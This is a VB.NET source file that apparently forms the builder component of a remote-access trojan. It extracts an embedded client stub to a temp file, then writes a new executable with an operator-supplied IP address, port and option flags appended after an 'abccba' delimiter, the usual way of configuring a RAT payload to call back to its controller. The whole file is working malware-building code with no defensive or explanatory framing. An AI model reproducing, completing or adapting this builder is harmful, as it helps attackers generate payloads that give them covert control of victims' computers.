Imports System.IO
Public Class build
    Dim text1, text2 As String
    Const spl = "abccba"
    Private Sub build_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim s As New SaveFileDialog
        s.Title = "Save Server"
        Dim stub As String
        Dim all As String = ""
        Const Filesplit = "FormStub"
        Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"
        s.ShowDialog()
        If s.FileName > "" Then
            text1 = ip.Text
            text2 = port.Text
            File.WriteAllBytes(temp, My.Resources.Client)
            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & spl & text1 & spl & text2 & spl & s_name.Text & spl & CheckBox2.CheckState & spl & TextBox2.Text & spl & CheckBox1.CheckState & spl & TextBox1.Text & spl & CheckBox3.CheckState & spl)
            FileClose(1)
            MsgBox("OK", MsgBoxStyle.OkOnly)
        End If
    End Sub
End Class